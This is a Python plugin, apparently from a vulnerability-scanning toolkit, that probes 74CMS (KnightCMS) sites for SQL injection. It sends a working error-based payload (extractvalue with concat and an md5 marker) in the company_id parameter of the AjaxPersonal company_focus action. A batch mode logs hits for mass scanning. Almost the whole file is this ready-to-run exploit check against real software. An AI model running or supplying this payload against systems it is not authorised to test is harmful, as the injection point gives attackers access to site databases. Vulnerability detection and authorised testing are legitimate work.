import requests,re,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class KnightCmsSql:
	def scan(self,baseurl):
		if baseurl[-1]=='/':
			baseurl=baseurl
		else:
			baseurl=baseurl+"/"
		url=baseurl+'index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa") and extractvalue(1,concat(0x7e,md5(99999999))) -- a'
		headers={"User-Agent": self.headers}
		response=requests.get(url,headers=headers,timeout=5,verify=self.ssl,proxies=self.proxy)
		if "ef775988943825d2871e1cfa75473ec" in response.text:
			OutPrintInfoSuc("74CMS", f"存在KnightCms-Sql: {baseurl}")
			if self.batch:
				OutPutFile("74cms_Sqli.txt", f"存在KnightCms-Sql: {baseurl}")
		else:
			if not self.batch:
				OutPrintInfo("74CMS", "不存在KnightCms-Sql")


	def main(self,target):
		self.batch = target["batch_work"]
		url = target["url"].strip('/ ')
		self.ssl = target["ssl"]
		self.headers = target["header"]
		proxy = target["proxy"]
		_, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)
		if not self.batch:
			OutPrintInfo("74CMS", "开始检测KnightCms-Sql...")
		self.scan(url)
		if not self.batch:
			OutPrintInfo("74CMS", "KnightCms-Sql检测结束")